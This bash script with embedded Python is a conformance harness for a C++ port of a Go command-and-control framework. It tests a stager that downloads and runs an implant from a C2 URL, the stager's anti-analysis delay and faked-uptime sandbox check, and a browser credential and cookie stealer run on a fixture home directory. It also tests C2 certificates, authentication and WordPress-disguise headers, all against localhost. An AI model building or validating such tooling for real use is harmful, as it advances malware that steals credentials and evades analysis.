#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
MOD=/tmp/interop-mod

if [ ! -d "$MOD/internal/crypto" ] || [ ! -d "$MOD/internal/protocol" ] || [ ! -d "$MOD/internal/dns" ] || [ ! -d "$MOD/internal/store" ] || [ ! -d "$MOD/internal/mesh" ]; then
    echo "[*] staging Go interop module (copy of RANGER_C3 crypto+protocol+dns+store+mesh packages)..."
    rm -rf "$MOD"
    mkdir -p "$MOD/internal" "$MOD/cmd/vecgen"
    cp /tmp/RANGER_C3/go.mod /tmp/RANGER_C3/go.sum "$MOD/"
    cp -r /tmp/RANGER_C3/internal/crypto "$MOD/internal/"
    cp -r /tmp/RANGER_C3/internal/protocol "$MOD/internal/"
    cp -r /tmp/RANGER_C3/internal/dns "$MOD/internal/"
    cp -r /tmp/RANGER_C3/internal/store "$MOD/internal/"
    cp -r /tmp/RANGER_C3/internal/mesh "$MOD/internal/"
fi
mkdir -p "$MOD/cmd/vecgen"
cp "$ROOT/harness/vecgen.go" "$MOD/cmd/vecgen/main.go"

echo "[*] go: generate crypto fixtures..."
(cd "$MOD" && go run ./cmd/vecgen gen) > "$ROOT/tests/vectors.txt"
echo "    -> tests/vectors.txt ($(wc -l < "$ROOT/tests/vectors.txt") lines)"

echo "[*] go: generate protocol fixtures..."
(cd "$MOD" && go run ./cmd/vecgen protocol-gen) > "$ROOT/tests/protocol_fixtures_go.json"
echo "    -> tests/protocol_fixtures_go.json"

if [ ! -d "$MOD/internal/payloads" ]; then
    echo "[*] staging Go payload registry (name/category/description contract)..."
    cp -r /tmp/RANGER_C3/internal/payloads "$MOD/internal/"
fi
mkdir -p "$MOD/cmd/payloadref"
cp "$ROOT/harness/payloads_ref.go" "$MOD/cmd/payloadref/main.go"
echo "[*] go: generate payload registry info fixture..."
(cd "$MOD" && go run ./cmd/payloadref) > "$ROOT/tests/payloads_info_go.json"
echo "    -> tests/payloads_info_go.json ($(python3 -c "import json,sys;print(len(json.load(open('$ROOT/tests/payloads_info_go.json'))))" 2>/dev/null || echo '?') modules)"
echo "[*] go: generate payload conformance fixture (deterministic modules)..."
(cd "$MOD" && go run ./cmd/payloadref conformance) > "$ROOT/tests/payloads_conformance_go.json"
echo "    -> tests/payloads_conformance_go.json ($(python3 -c "import json;print(len(json.load(open('$ROOT/tests/payloads_conformance_go.json'))))" 2>/dev/null || echo '?') cases)"

echo "[*] c++: build + byte-compat checks (crypto + protocol)..."
(cd "$ROOT" && make -s test)

echo "[*] go: verify C++ crypto artifacts..."
(cd "$MOD" && go run ./cmd/vecgen check "$ROOT/tests/cpp_artifacts.txt")

echo "[*] go: verify C++ protocol artifacts..."
(cd "$MOD" && go run ./cmd/vecgen protocol-check "$ROOT/tests/cpp_protocol_artifacts.json")

echo "[*] go: verify C++ DNS queries through the real tunnel parser..."
(cd "$MOD" && go run ./cmd/vecgen dns-check "$ROOT/tests/cpp_dns_queries.txt")

echo "[*] c++: CLI parity (payload runner + stager)..."
(cd "$ROOT" && make -s build/solidsnake-payloads build/solidsnake-stager)

[ -d "$MOD/cmd/payloads" ] || cp -r /tmp/RANGER_C3/cmd/payloads "$MOD/cmd/"
python3 - "$ROOT" "$MOD" <<'PYEOF'
import json, os, subprocess, sys

root, mod = sys.argv[1], sys.argv[2]
go_info = json.load(open(os.path.join(root, "tests/payloads_info_go.json")))
goby = {p["name"]: p for p in go_info}

out = subprocess.run([os.path.join(root, "build/solidsnake-payloads"), "--list"],
                     capture_output=True, text=True, check=True).stdout
snake = json.loads(out)
fail = 0
for p in snake:
    if goby.get(p["name"]) != p:
        print("  FAIL runner --list entry differs from Go:", p)
        fail += 1
missing = sorted(set(goby) - {p["name"] for p in snake})
if missing:
    print("  FAIL runner --list missing modules:", missing)
    fail += 1
if len(snake) != 24:
    print("  FAIL runner --list module count:", len(snake))
    fail += 1

snakeh = subprocess.run([os.path.join(root, "build/solidsnake-payloads"), "--help"],
                     capture_output=True, text=True, check=True).stdout
goh = subprocess.run(["go", "run", "./cmd/payloads", "--help"], cwd=mod,
                     capture_output=True, text=True, check=True).stdout
snakel, gol = snakeh.split("\n"), goh.split("\n")
if snakel[1:] != gol[1:]:
    print("  FAIL runner usage block differs from Go (banner line excluded)")
    for a, b in zip(snakel[1:], gol[1:]):
        if a != b:
            print("    snake:", a)
            print("    go:", b)
            break
    fail += 1
if fail:
    sys.exit(1)
print("    runner: --list 24/24 modules value-identical to Go; usage block identical (banner aside)")
PYEOF

CLI=/tmp/snake-cli
rm -rf "$CLI" && mkdir -p "$CLI"
[ -d "$MOD/cmd/stager" ] || cp -r /tmp/RANGER_C3/cmd/stager "$MOD/cmd/"
(cd "$MOD" && go build -o "$CLI/go-stager" ./cmd/stager)

command -v "${CC:-cc}" >/dev/null 2>&1 || {
    echo "FAIL: no C compiler (${CC:-cc}) for the stager argv recorder"
    exit 1
}
cat > "$CLI/helper.c" <<'CEOF'
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
int main(int argc, char** argv) {
    const char* out = getenv("SNAKE_ARGV_OUT");
    if (!out) return 0;
    int fd = open("/proc/self/exe", O_RDONLY);
    struct stat st;
    unsigned mode = 0;
    if (fd >= 0 && fstat(fd, &st) == 0) mode = (unsigned)(st.st_mode & 07777);
    if (fd >= 0) close(fd);
    FILE* f = fopen(out, "a");
    if (!f) return 0;
    fprintf(f, "mode=%o args=", mode);
    for (int i = 1; i < argc; i++) fprintf(f, "%s%s", i > 1 ? " " : "", argv[i]);
    fprintf(f, "\n");
    fclose(f);
    return 0;
}
CEOF
"${CC:-cc}" -O0 -o "$CLI/helper" "$CLI/helper.c"
printf '100.00 200.00\n' > "$CLI/fake_uptime"

cat > "$CLI/catcher.py" <<'PYEOF'
import http.server, socketserver, sys
log_path, payload_path = sys.argv[1], sys.argv[2]
payload = open(payload_path, "rb").read()

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open(log_path, "a") as fh:
            fh.write(self.command + " " + self.path + "\n")
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)
    def log_message(self, *a):
        pass

socketserver.TCPServer.allow_reuse_address = True
srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
open(sys.argv[3], "w").write(str(srv.server_address[1]))
srv.serve_forever()
PYEOF
python3 "$CLI/catcher.py" "$CLI/req.log" "$CLI/helper" "$CLI/port" >"$CLI/catcher.out" 2>&1 &
CATCH=$!
trap 'kill "$CATCH" 2>/dev/null || true' EXIT
PORT=""
for _ in $(seq 1 50); do
    if [ -s "$CLI/port" ]; then PORT=$(cat "$CLI/port"); break; fi
    sleep 0.1
done
[ -n "$PORT" ] || { echo "FAIL: stager catcher did not start"; exit 1; }
URL="http://127.0.0.1:$PORT"
KEY=aabbccddeeff00112233445566778899

run_timed() {
    local tag="$1"; shift
    local t0=$(date +%s%3N)
    SNAKE_ARGV_OUT="$CLI/$tag.argv" "$@" >"$CLI/$tag.out" 2>"$CLI/$tag.err"
    echo $? > "$CLI/$tag.rc"
    echo $(( $(date +%s%3N) - t0 )) > "$CLI/$tag.ms"
}

ENV_LEG=1
unshare -m true 2>/dev/null || ENV_LEG=0
if [ "$ENV_LEG" = 0 ]; then
    echo "    WARN: unshare -m unavailable, skipping the faked-uptime env-check leg"
fi

LEGS=()
run_timed go "$CLI/go-stager" --c2 "$URL" --payload implant --key "$KEY" & LEGS+=($!)
run_timed snake "$ROOT/build/solidsnake-stager" --c2 "$URL" --payload implant --key "$KEY" & LEGS+=($!)
if [ "$ENV_LEG" = 1 ]; then
    run_timed go-env unshare -m sh -c "mount --bind '$CLI/fake_uptime' /proc/uptime && exec '$CLI/go-stager' --c2 '$URL' --payload implant --key '$KEY'" & LEGS+=($!)
    run_timed snake-env unshare -m sh -c "mount --bind '$CLI/fake_uptime' /proc/uptime && exec '$ROOT/build/solidsnake-stager' --c2 '$URL' --payload implant --key '$KEY'" & LEGS+=($!)
fi
for pid in "${LEGS[@]}"; do wait "$pid" || true; done

python3 - "$CLI" "$URL" "$KEY" "$ENV_LEG" <<'PYEOF'
import json, os, sys
cli, url, key, env_leg = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4] == "1"
fail = 0
def rd(name):
    with open(os.path.join(cli, name)) as fh:
        return fh.read()
def rows(tag):
    return [rd(tag + "." + ext).strip() for ext in ("argv", "rc", "ms", "out")]

snakea, snakerc, snakems, snakeout = rows("snake")
goargv, gorc, goms, goout = rows("go")
expected = "mode=755 args=--debug=false --key %s --c2 %s/ws" % (key, url)
if snakea != expected:
    print("  FAIL snake argv recorder:", snakea); fail += 1
if snakea != goargv:
    print("  FAIL argv differs from Go:\n    snake:", snakea, "\n    go:", goargv); fail += 1
for tag, rc, ms in (("go", gorc, goms), ("snake", snakerc, snakems)):
    if rc != "0":
        print("  FAIL", tag, "stager exit", rc); fail += 1
    if not (4500 <= int(ms) <= 25000):
        print("  FAIL", tag, "anti-analysis delay out of the C3 window:", ms, "ms"); fail += 1
for tag, out in (("go", goout), ("snake", snakeout)):
    try:
        j = json.loads(out)
    except Exception as e:
        print("  FAIL", tag, "stager stdout is not JSON:", out, e); fail += 1
        continue
    if j.get("status") != "deployed" or j.get("version") != "3.0.0" or not isinstance(j.get("pid"), int):
        print("  FAIL", tag, "stager JSON shape:", j); fail += 1

req = [l for l in rd("req.log").split("\n") if l.strip()]
exp_req = "GET /api/v1/beacon?stage2=1&payload=implant"
if req != [exp_req, exp_req]:
    print("  FAIL REST fetch log (expected two identical stage-2 requests):", req); fail += 1
if os.path.exists(os.path.join(cli, "go-env.argv")) or os.path.exists(os.path.join(cli, "snake-env.argv")):
    print("  FAIL faked-uptime run still fetched the payload"); fail += 1
if env_leg:
    for tag in ("go-env", "snake-env"):
        if rd(tag + ".rc").strip() != "0":
            print("  FAIL", tag, "should exit 0 after the env check"); fail += 1
        if rd(tag + ".out").strip():
            print("  FAIL", tag, "should print nothing when the env check fails"); fail += 1
if fail:
    sys.exit(1)
print("    stager: REST fetch + drop (0755) + argv + status JSON identical to Go; delay honoured")
if env_leg:
    print("    stager: faked-uptime env check exits 0 without fetching on both sides")
PYEOF
kill "$CATCH" 2>/dev/null || true
trap - EXIT

echo "[*] c++: browserstealer fixture HOME (Go vs solidSNAKE)..."
BR=/tmp/snake-browser
rm -rf "$BR" && mkdir -p "$BR/home" "$BR/tmp" "$BR/empty"
python3 - "$BR/home" <<'PYEOF'
import os, sqlite3, sys

home = sys.argv[1]


def mk(*parts):
    p = os.path.join(home, *parts)
    os.makedirs(p, exist_ok=True)
    return p


def store(path, script):
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(script)
    con.commit()
    con.close()


ff = mk(".mozilla", "firefox", "aaa.default")
with open(os.path.join(ff, "logins.json"), "w") as fh:
    fh.write('{"logins":[{"id":1,"hostname":"https://example.com","httpRealm":null,'
             '"formSubmitURL":"https://example.com","usernameField":"user",'
             '"passwordField":"pass","encryptedUsername":"dXNlcg==",'
             '"encryptedPassword":"cGFzcw==","guid":"{a1}","encType":1,'
             '"timeCreated":1700000000000,"timeLastUsed":1700000001000,'
             '"timePasswordChanged":1700000002000,"timesUsed":4},'
             '{"id":2,"hostname":"https://mail.example.com","httpRealm":"Example Mail",'
             '"formSubmitURL":"","usernameField":"","passwordField":"",'
             '"encryptedUsername":"dXNlcjI=","encryptedPassword":"cGFzczI=",'
             '"guid":"{b2}","encType":1,"timeCreated":1700000000001,'
             '"timeLastUsed":1700000001001,"timePasswordChanged":1700000002001,'
             '"timesUsed":1}],"potentiallyVulnerablePasswords":[],'
             '"dismissedBreachAlertsByLoginGUID":{},"version":3}')
store(os.path.join(ff, "cookies.sqlite"),
      "CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, host TEXT, name TEXT, value TEXT, "
      "path TEXT, expiry INTEGER);"
      "INSERT INTO moz_cookies (host,name,value,path,expiry) VALUES "
      "('example.com','sid','abc123','/',1700000000),"
      "('example.com','eid',NULL,'/',NULL),"
      "('mail.example.com','theme','dark','/mail',1800000000);")
store(os.path.join(ff, "places.sqlite"),
      "CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count "
      "INTEGER, last_visit_date INTEGER);"
      "INSERT INTO moz_places (url,title,visit_count,last_visit_date) VALUES "
      "('https://example.com/?a=1&b=2','Example Domain',7,1700000000);")
ff2 = mk(".mozilla", "firefox", "bbb.dev-edition")
store(os.path.join(ff2, "cookies.sqlite"),
      "CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, host TEXT, name TEXT, value TEXT, "
      "path TEXT, expiry INTEGER);"
      "INSERT INTO moz_cookies (host,name,value,path,expiry) VALUES ('dev.example','k','v','/',NULL);")
with open(os.path.join(ff2, "places.sqlite"), "w") as fh:
    fh.write("this is not a sqlite database\n")
snap = mk("snap", "firefox", "common", ".mozilla", "firefox", "snap.profile")
store(os.path.join(snap, "cookies.sqlite"),
      "CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, host TEXT, name TEXT, value TEXT, "
      "path TEXT, expiry INTEGER);"
      "INSERT INTO moz_cookies (host,name,value,path,expiry) VALUES ('snap.example','s','1','/',NULL);")

ch = mk(".config", "google-chrome", "Default")
store(os.path.join(ch, "Login Data"),
      "CREATE TABLE logins (origin_url TEXT, username_value TEXT, password_value BLOB, "
      "date_created INTEGER);"
      "INSERT INTO logins VALUES "
      "('https://site.example/login','alice',X'01020304',13300000000000000),"
      "('https://other.example/','bob',NULL,13300000000000001);")
store(os.path.join(ch, "Cookies"),
      "CREATE TABLE cookies (host_key TEXT, name TEXT, value BLOB, path TEXT, "
      "expires_utc INTEGER);"
      "INSERT INTO cookies VALUES "
      "('.example.com','token',X'deadbeef','/',13300000000000000),"
      "('.example.com','sid',X'00','/',NULL),"
      "('.example.com','pref',X'','/x',13300000000000002);")
store(os.path.join(ch, "History"),
      "CREATE TABLE urls (url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER);"
      "INSERT INTO urls VALUES ('https://site.example/?q=a&b','Site Home',5,13300000000000000);")
sp = mk(".config", "google-chrome", "System Profile")
store(os.path.join(sp, "Cookies"),
      "CREATE TABLE cookies (host_key TEXT, name TEXT, value BLOB, path TEXT, "
      "expires_utc INTEGER);"
      "INSERT INTO cookies VALUES ('.gstatic.com','g',X'01','/',NULL);")
mk(".config", "google-chrome", "Cache")
with open(os.path.join(home, ".config", "google-chrome", "Local State"), "w") as fh:
    fh.write("{}\n")
ch2 = mk(".config", "chromium", "Default")
store(os.path.join(ch2, "Cookies"),
      "CREATE TABLE cookies (host_key TEXT, name TEXT, value BLOB, path TEXT, "
      "expires_utc INTEGER);"
      "INSERT INTO cookies VALUES ('.chromium.example','c',X'7f','/',NULL);")
ed = mk(".config", "microsoft-edge", "Profile 1")
store(os.path.join(ed, "Login Data"),
      "CREATE TABLE logins (origin_url TEXT, username_value TEXT, password_value BLOB, "
      "date_created INTEGER);"
      "INSERT INTO logins VALUES ('https://edge.example/','carol',X'ff',13300000000000003);")
br = mk(".config", "BraveSoftware", "Brave-Browser", "Default")
store(os.path.join(br, "Cookies"),
      "CREATE TABLE cookies (host_key TEXT, name TEXT, value BLOB, path TEXT, "
      "expires_utc INTEGER);"
      "INSERT INTO cookies VALUES ('.brave.example','b',X'41','/',NULL);")
PYEOF

(cd "$MOD" && go build -o "$BR/payloadref" ./cmd/payloadref)
for leg in full empty; do
    if [ "$leg" = empty ]; then src="$BR/empty"; else src="$BR/home"; fi
    HOME="$src" TMPDIR="$BR/tmp" "$BR/payloadref" exec browserstealer > "$BR/go-$leg.json"
    HOME="$src" TMPDIR="$BR/tmp" "$ROOT/build/solidsnake-payloads" browserstealer > "$BR/snake-$leg.json"
done

python3 - "$BR" <<'PYEOF'
import json, os, sys

br = sys.argv[1]
fail = 0


def norm(o):
    if isinstance(o, bool):
        return o
    if isinstance(o, float):
        return int(o) if o.is_integer() else o
    if isinstance(o, dict):
        return {k: norm(v) for k, v in o.items()}
    if isinstance(o, list):
        return [norm(v) for v in o]
    return o


def canon(leg, side):
    path = os.path.join(br, "%s-%s.json" % (side, leg))
    obj = json.load(open(path))
    obj.pop("timestamp", None)
    return obj, json.dumps(norm(obj), sort_keys=True)


for leg in ("full", "empty"):
    go, gs = canon(leg, "go")
    snake, cs = canon(leg, "snake")
    if gs != cs:
        print("  FAIL browserstealer (%s HOME) differs from Go" % leg)
        print("    go:", gs[:500])
        print("    snake:", cs[:500])
        fail += 1
    if leg == "full":
        if go.get("total_credentials") != 5 or go.get("total_cookies") != 11:
            print("  FAIL fixture counters:", go.get("total_credentials"), go.get("total_cookies"))
            fail += 1
        for side in ("go", "snake"):
            raw = open(os.path.join(br, "%s-full.json" % side)).read()
            if "\\u0026" not in raw:
                print("  FAIL %s output does not HTML-escape the & in the extracted URL" % side)
                fail += 1
    else:
        if go.get("total_credentials") != 0 or go.get("total_cookies") != 0:
            print("  FAIL empty-fixture counters should be zero")
            fail += 1

left = [n for n in os.listdir(os.path.join(br, "tmp")) if n.startswith("browser-")]
if left:
    print("  FAIL temp store copies left behind:", left)
    fail += 1

if fail:
    sys.exit(1)
print("    browserstealer: full fixture HOME (Firefox x3, Chrome x3, Edge, Brave) and the "
      "empty HOME value-identical to Go; temp copies cleaned up")
PYEOF

echo "[*] c++: build the store test..."
(cd "$ROOT" && make -s build/test_store)

mkdir -p "$MOD/cmd/storeref"
cp "$ROOT/harness/store_ref.go" "$MOD/cmd/storeref/main.go"
echo "[*] go: store report (real internal/store + go-sqlite3)..."
(cd "$MOD" && go run ./cmd/storeref /tmp/snake-store-go-report) > "$ROOT/tests/store_report_go.json"

echo "[*] c++: store report (vendored sqlite3 + solidSNAKE store)..."
"$ROOT/build/test_store" --report /tmp/snake-store-cpp-report > /tmp/snake-store-cpp-report.json

python3 - "$ROOT" <<'PYEOF'
import json, sys

root = sys.argv[1]
go = json.load(open(root + "/tests/store_report_go.json"))
snake = json.load(open("/tmp/snake-store-cpp-report.json"))
gs = {s["name"]: s["value"] for s in go["steps"]}
cs = {s["name"]: s["value"] for s in snake["steps"]}
fail = 0
if list(gs) != list(cs):
    print("  FAIL store step sequence differs")
    print("    go:", list(gs))
    print("    snake:", list(cs))
    fail += 1
for k in gs:
    if k not in cs:
        print("  FAIL store step missing in snake:", k)
        fail += 1
    elif gs[k] != cs[k]:
        print("  FAIL store step differs:", k)
        print("    go:", json.dumps(gs[k], sort_keys=True)[:400])
        print("    snake:", json.dumps(cs[k], sort_keys=True)[:400])
        fail += 1
if fail:
    sys.exit(1)
print("    store: %d steps identical to Go (schema, implant/task/exfil/mesh semantics)" % len(gs))
PYEOF

echo "[*] c++: build the C2 binary..."
(cd "$ROOT" && make -s build/solidsnake-c2)

GO_C2="${RANGER_C3_DIR:-/tmp/RANGER_C3}/build/ranger-c2"
if [ ! -x "$GO_C2" ]; then
    echo "[*] go: build the reference C2 (cmd/c2)..."
    (cd "${RANGER_C3_DIR:-/tmp/RANGER_C3}" && go build -o build/ranger-c2 ./cmd/c2)
fi

mkdir -p "$MOD/cmd/certref"
cp "$ROOT/harness/cert_ref.go" "$MOD/cmd/certref/main.go"

echo "[*] go+cc: C2 cert generation / reuse / --force-certs parity..."
python3 - "$ROOT" "$MOD" "$GO_C2" <<'PYEOF'
import hashlib, json, os, re, shutil, stat, subprocess, sys

root, mod, go_c2 = sys.argv[1], sys.argv[2], sys.argv[3]
work = "/tmp/snake-c2cert"
shutil.rmtree(work, ignore_errors=True)
fail = 0
LOG_PREFIX = re.compile(rb"^\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2} ", re.M)


def run(cmd, cwd):
    return subprocess.run(cmd, cwd=cwd, capture_output=True)


def strip_log(b):
    return LOG_PREFIX.sub(b"", b).decode("utf-8", "replace").strip()


def sha(path):
    return hashlib.sha256(open(path, "rb").read()).hexdigest()


def mode(path):
    return stat.S_IMODE(os.stat(path).st_mode)


def goref(*args):
    p = subprocess.run(["go", "run", "./cmd/certref", *args], cwd=mod, capture_output=True, text=True)
    if p.returncode != 0:
        print("  FAIL certref %s: %s" % (args[0], p.stderr.strip()[:400]))
        sys.exit(1)
    return json.loads(p.stdout)


sides = {
    "go": (go_c2, os.path.join(work, "go")),
    "snake": (os.path.join(root, "build/solidsnake-c2"), os.path.join(work, "snake")),
}
for wd in [w for _, w in sides.values()]:
    os.makedirs(wd, exist_ok=True)

flags = ["--gen-certs-only", "--id", "c2-testid", "--cert-sans", "extra.example.com,10.1.2.3"]
READY = "certs ready: certs/c2-cert.pem / certs/c2-key.pem"
GEN = "[c2] generated self-signed cert: certs/c2-cert.pem / certs/c2-key.pem"
REUSE = ("[c2] reusing existing certs: certs/c2-cert.pem / certs/c2-key.pem "
         "(use --force-certs to regenerate)")

info = {}
for name, (binp, wd) in sides.items():
    p = run([binp, *flags], wd)
    if p.returncode != 0:
        print("  FAIL %s --gen-certs-only exit %d: %s" % (name, p.returncode, p.stderr[:300]))
        fail += 1
    if p.stdout.decode().strip() != READY:
        print("  FAIL %s stdout: %r" % (name, p.stdout))
        fail += 1
    if strip_log(p.stderr) != GEN:
        print("  FAIL %s stderr: %r" % (name, strip_log(p.stderr)))
        fail += 1
    cert = os.path.join(wd, "certs/c2-cert.pem")
    key = os.path.join(wd, "certs/c2-key.pem")
    for f in (cert, key):
        if mode(f) != 0o644:
            print("  FAIL %s mode %s: %o" % (name, f, mode(f)))
            fail += 1
    if mode(os.path.join(wd, "certs")) != 0o700:
        print("  FAIL %s certs dir mode: %o" % (name, mode(os.path.join(wd, "certs"))))
        fail += 1
    info[name] = {"cert": cert, "key": key, "sha": sha(cert)}

dumps = {name: goref("dump", i["cert"]) for name, i in info.items()}
TIME_KEYS = {"not_before_offset_secs", "not_after_offset_secs", "validity_seconds"}
go_c, snake_c = dumps["go"], dumps["snake"]
for k in sorted(set(go_c) | set(snake_c)):
    if k in TIME_KEYS:
        continue
    if go_c.get(k) != snake_c.get(k):
        print("  FAIL cert property %s: go=%r snake=%r" % (k, go_c.get(k), snake_c.get(k)))
        fail += 1
for name, d in dumps.items():
    nb, na, span = d["not_before_offset_secs"], d["not_after_offset_secs"], d["validity_seconds"]
    if not (-3660 < nb < -3540):
        print("  FAIL %s notBefore offset %d" % (name, nb))
        fail += 1
    if not (365 * 86400 - 120 < na < 365 * 86400 + 120):
        print("  FAIL %s notAfter offset %d" % (name, na))
        fail += 1
    if not (365 * 86400 + 3600 - 180 < span < 365 * 86400 + 3600 + 180):
        print("  FAIL %s validity span %d" % (name, span))
        fail += 1

for name, i in info.items():
    rt = goref("roundtrip", i["cert"], i["key"], "localhost")
    if not rt.get("handshake") or not rt.get("verified") or rt.get("expired"):
        print("  FAIL %s TLS roundtrip: %s" % (name, json.dumps(rt)))
        fail += 1

for name, (binp, wd) in sides.items():
    p = run([binp, *flags], wd)
    if p.stdout.decode().strip() != READY or strip_log(p.stderr) != REUSE:
        print("  FAIL %s reuse message: %r / %r" % (name, p.stdout, strip_log(p.stderr)))
        fail += 1
    if sha(info[name]["cert"]) != info[name]["sha"]:
        print("  FAIL %s cert rewritten on reuse" % name)
        fail += 1
    p = run([binp, "--gen-certs-only", "--force-certs", "--id", "c2-testid"], wd)
    if strip_log(p.stderr) != GEN:
        print("  FAIL %s --force-certs message: %r" % (name, strip_log(p.stderr)))
        fail += 1
    if sha(info[name]["cert"]) == info[name]["sha"]:
        print("  FAIL %s --force-certs did not regenerate" % name)
        fail += 1
    os.remove(info[name]["key"])
    before = sha(info[name]["cert"])
    p = run([binp, *flags], wd)
    if strip_log(p.stderr) != GEN or sha(info[name]["cert"]) == before:
        print("  FAIL %s missing-key regeneration: %r" % (name, strip_log(p.stderr)))
        fail += 1

if fail:
    sys.exit(1)
print("    C2 certs: startup stdout/stderr, canonical properties (Ed25519, CN=node id, "
      "O=Ranger C3, SAN set, KeyUsage/EKU, CA:FALSE), 1h/365d validity, reuse + --force-certs + "
      "missing-key semantics and a Go-TLS handshake identical on both sides")
PYEOF

echo "[*] go+cc: C2 HTTP/WS API parity (routes, auth, payloads, dashboard, WS beacon)..."
python3 - "$ROOT" "$GO_C2" <<'PYEOF'
import http.client, json, os, re, shutil, signal, socket, sqlite3, ssl, subprocess, sys, time

root, go_c2 = sys.argv[1], sys.argv[2]
snake_c2 = os.path.join(root, "build/solidsnake-c2")
work = "/tmp/snake-c2api"
shutil.rmtree(work, ignore_errors=True)

KEY = "ab" * 32
IMPID = "snaketest0000001"
PASSWORD = "snake-interop"
fails = 0

MANIFEST = ('{"version":"1.0","payloads":[{"name":"demo","file":"demo.py",'
            '"category":"general","desc":"demo & test","platform":"all","args":""}]}')

def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p

def start(binary, wd, port):
    os.makedirs(wd, exist_ok=True)
    os.makedirs(os.path.join(wd, "payloads"), exist_ok=True)
    with open(os.path.join(wd, "payloads", "demo.py"), "w") as f:
        f.write("print(1)\n")
    with open(os.path.join(wd, "payloads", "manifest.json"), "w") as f:
        f.write(MANIFEST)
    log = open(os.path.join(wd, "c2.log"), "wb")
    p = subprocess.Popen([binary, "--listen", "127.0.0.1:%d" % port, "--gen-certs",
                          "--db", "data/c2.db", "--password", PASSWORD, "--key", KEY,
                          "--id", "snake-c2-test"], cwd=wd, stdout=log, stderr=log)
    for _ in range(150):
        try:
            s = socket.create_connection(("127.0.0.1", port), 0.2)
            s.close()
            return p
        except OSError:
            if p.poll() is not None:
                print("  FAIL %s exited early" % binary)
                sys.exit(1)
            time.sleep(0.1)
    print("  FAIL %s never listened" % binary)
    sys.exit(1)

def ssl_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c

def req(port, method, path, body=None, headers=None):
    c = http.client.HTTPSConnection("127.0.0.1", port, timeout=10, context=ssl_ctx())
    try:
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        data = r.read()
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        return r.status, data, hdrs
    finally:
        c.close()

def norm(b):
    b = re.sub(rb'"uptime":"[^"]*"', b'"uptime":"<t>"', b)
    b = re.sub(rb'"task_id":"T\d+"', b'"task_id":"<id>"', b)
    b = re.sub(rb'"id":"T\d+"', b'"id":"<id>"', b)
    b = re.sub(rb'"ts":\d+', b'"ts":<ts>', b)
    b = re.sub(rb'"first_seen":"[^"]*"', b'"first_seen":"<t>"', b)
    b = re.sub(rb'"last_seen":"[^"]*"', b'"last_seen":"<t>"', b)
    b = re.sub(rb'"target_proc":"[^"]*"', b'"target_proc":"<proc>"', b)
    b = re.sub(rb'"jitter_score":[0-9.e+-]*', b'"jitter_score":<j>', b)
    return b

gport, cport = free_port(), free_port()
silent = subprocess.DEVNULL
try:
    shutil.rmtree(os.path.join(work, "go"), ignore_errors=True)
    shutil.rmtree(os.path.join(work, "snake"), ignore_errors=True)
    gpid = start(go_c2, os.path.join(work, "go"), gport)
    cpid = start(snake_c2, os.path.join(work, "snake"), cport)

    def cmp_case(name, method, path, body=None, headers=None, want_headers=(), skip_headers=False):
        global fails
        gs, gb, gh = req(gport, method, path, body, headers)
        cs, cb, ch = req(cport, method, path, body, headers)
        if gs != cs or norm(gb) != norm(cb):
            print("  FAIL %s: go=%s %r snake=%s %r" % (name, gs, gb[:120], cs, cb[:120]))
            fails += 1
            return
        for h in want_headers:
            if gh.get(h) != ch.get(h):
                print("  FAIL %s header %s: go=%r snake=%r" % (name, h, gh.get(h), ch.get(h)))
                fails += 1

    cmp_case("login wrong password", "POST", "/api/dashboard/login", '{"password":"nope"}')
    cmp_case("login malformed body", "POST", "/api/dashboard/login", "not-json")
    cmp_case("login wrong method", "GET", "/api/dashboard/login")
    cmp_case("dashboard redirect (no token)", "GET", "/api/dashboard/implants",
             want_headers=("location",))
    cmp_case("dashboard ui redirect (no token)", "GET", "/dashboard", want_headers=("location",))
    cmp_case("ws without upgrade", "GET", "/ws")
    cmp_case("beacon plaintext rejected", "POST", "/api/v1/beacon", "junk")
    cmp_case("beacon wrong method", "GET", "/api/v1/beacon")
    cmp_case("result plaintext rejected", "POST", "/api/v1/result", "junk")
    cmp_case("dns receive", "POST", "/dns/imp1/txt", "hello")
    cmp_case("dns malformed path", "POST", "/dns/onlyone", "x")
    cmp_case("payload serve", "GET", "/api/v1/payloads/demo.py",
             want_headers=("content-type", "x-payload-version"))
    cmp_case("payload missing", "GET", "/api/v1/payloads/nope.py")
    cmp_case("payload traversal", "GET", "/api/v1/payloads/..%2Fsecret")
    cmp_case("wordpress mimicry (.php)", "GET", "/index.php",
             want_headers=("content-type", "x-powered-by", "x-generator"))
    cmp_case("wordpress mimicry (root)", "GET", "/", want_headers=("x-generator",))
    cmp_case("catch-all redirect", "GET", "/definitely-not-here",
             want_headers=("location", "content-type"))
    cmp_case("unknown api path", "GET", "/api/v1/nope")

    def login(port):
        s, b, h = req(port, "POST", "/api/dashboard/login", '{"password":"%s"}' % PASSWORD)
        assert s == 200, (port, s, b)
        return json.loads(b)["token"]

    gt, ct = login(gport), login(cport)
    gtok = {"Authorization": "Bearer " + gt}
    ctok = {"Authorization": "Bearer " + ct}
    cmp_case("implants (empty)", "GET", "/api/dashboard/implants", headers=gtok)
    cmp_case("config", "GET", "/api/dashboard/config", headers=gtok)
    cmp_case("peers (empty)", "GET", "/api/dashboard/peers", headers=gtok)
    cmp_case("implant detail unknown", "GET", "/api/dashboard/implant/nope", headers=gtok)
    cmp_case("tasks (unknown implant)", "GET", "/api/dashboard/tasks/nope", headers=gtok)
